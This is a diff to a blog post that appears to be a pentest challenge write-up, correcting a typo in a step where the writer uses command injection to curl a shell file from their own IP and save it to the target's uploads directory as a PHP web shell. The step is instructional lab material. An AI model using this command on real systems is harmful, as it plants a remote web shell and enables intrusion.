@@ -52,7 +52,7 @@ Now we can use curl to grab this shell and save it for us to access it. Saving i
 [<img src="{{ site.baseurl }}/images/pentestchallengeuk/2.png"
  style="width: 800px;"/>]({{site.baseurl }}/images/pentestchallengeuk/2.png)
 
-No we'll use a command like this to grab our shell as a text file, and save it to the uploads directory as a .php file, the bit in angle brackets is what the server is already doing so we don't need to enter it into the input box:
+Now we'll use a command like this to grab our shell as a text file, and save it to the uploads directory as a .php file, the bit in angle brackets is what the server is already doing so we don't need to enter it into the input box:
 ```
 <curl> http://<myIPaddress>/shell.txt -o uploads/shell.php
 ```
